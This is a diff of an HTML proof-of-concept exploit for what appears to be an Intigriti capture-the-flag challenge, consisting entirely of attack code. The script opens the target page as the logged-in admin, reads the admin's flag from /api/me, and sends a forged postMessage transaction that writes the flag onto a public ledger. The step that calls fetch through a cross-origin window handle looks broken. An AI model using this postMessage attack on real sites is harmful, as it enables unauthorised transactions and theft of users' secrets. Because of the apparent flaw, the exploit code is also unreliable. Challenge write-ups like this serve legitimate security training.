@@ -1,32 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Intigriti Challenge 0126 PoC</title>
-</head>
 <body>
-  <h1>Loading…</h1>
+    <script>
+        // 1. Open the Buy page as the Admin
+        const win = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");
 
-  <script>
-    // Step 1: open marketplace as a top-level window
-    // This ensures admin cookies are sent (SameSite=Lax)
-    const win = window.open(
-      "https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1",
-      "_blank"
-    );
-
-    // Step 2: wait for marketplace JS to initialize
-    setTimeout(() => {
-      // Step 3: exploit postMessage origin check bypass
-      win.postMessage({
-        type: "submitTransaction",
-        transaction: {
-          toAddress: "Testing", // admin wallet
-          currency: "1337COIN",
-          amount: 1337
-        }
-      }, "*");
-    }, 2000);
-  </script>
+        setTimeout(() => {
+            // 2. Fetch the flag first (as the Admin)
+            win.fetch('/api/me')
+                .then(r => r.json())
+                .then(data => {
+                    const flag = data.flag;
+                    
+                    // 3. Now "Follow the trail"
+                    // We send a transaction where the "toAddress" IS the flag!
+                    // This puts the flag directly into the public Market Watch ledger.
+                    win.postMessage({
+                        type: 'submitTransaction',
+                        transaction: {
+                            toAddress: flag, // The flag becomes the recipient address
+                            currency: 'BTC',
+                            amount: 0.000001
+                        }
+                    }, '*');
+                });
+                
+            // 4. Redirect to Market Watch to see the "Trail" (and the flag)
+            setTimeout(() => {
+                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
+            }, 3000);
+        }, 5000);
+    </script>
 </body>
 </html>
